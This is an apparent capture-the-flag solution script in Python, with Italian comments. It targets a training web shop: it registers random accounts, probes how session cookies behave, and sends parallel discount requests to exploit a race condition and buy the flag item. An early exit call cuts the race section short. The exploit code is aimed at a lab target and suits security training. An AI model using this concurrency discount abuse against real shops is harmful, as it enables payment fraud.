import requests
import string
import random
import re
import threading
import time

url = "http://discount.training.offdef.it/"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!?]+}", data)
	if search:
		return search.group()
	  
def find_discount_code(data):
	search = re.search("Code: (\w+)", data)
	if search:
		return search.group(1)

def gen_ran_string(size=25):
	return "".join(random.choice(string.ascii_letters) for _ in range(size))

def register(s, u, p):
	data = {"username": u, "password": p}
	return s.post(url+"/register", data=data)

def login(s, u, p):
	data = {"username": u, "password": p}
	return s.post(url+"/login", data=data)

def logout(s):
	return s.get(url+"/logout")

def login_vanilla(u, p):
	data = {"username": u, "password": p}
	return requests.post(url+"/login", data=data)

def add_to_cart(s, item_id):
	params = {"item_id": item_id}
	return s.get(url+"/add_to_cart", params=params)

def apply_discount(s, discount_code):
	data = {"discount": discount_code}
	return s.post(url+"/apply_discount", data=data)

def pay(s):
	return s.get(url+"/cart/pay")

def items(s):
	return s.get(url+"/items")

flag = None
while flag == None:
	u = gen_ran_string(size=10)
	p = gen_ran_string(size=10)   # big user
	s = requests.Session()
	threads=[]
	
	r = register(s, u, p)			# register
	print("cookie prima della login:\t", s.cookies["session"])
	discount_code = find_discount_code(r.text) 				# we take the discount code
	#print(discount_code)
	r = login(s, u, p)
	print("cookie dopo la login:\t\t", r.cookies["session"])
	r = login_vanilla(u, p)
	print("cookie dopo la login_vanilla:\t", r.cookies["session"])
	s.cookies.clear()
	r = login(s, u, p)
	print("cookie dopo la clear:\t\t", r.cookies["session"])
	logout(s)
	logout(s)
	logout(s)
	r = login(s, u, p)
	print("cookie dopo la logout:\t\t", r.cookies["session"])

	exit(0)
	add_to_cart(s, 21)										# put in cart the flag item (item_id = 21 of item flag)
	for i in range(10):
		threads.append(threading.Thread(target=apply_discount, args=(s, discount_code)))
	for i in range(10):	
		threads[i].start()	
	for i in range(10):
		threads[i].join()
	pay(s)
	flag = find_flag(items(s).text)
print(flag)

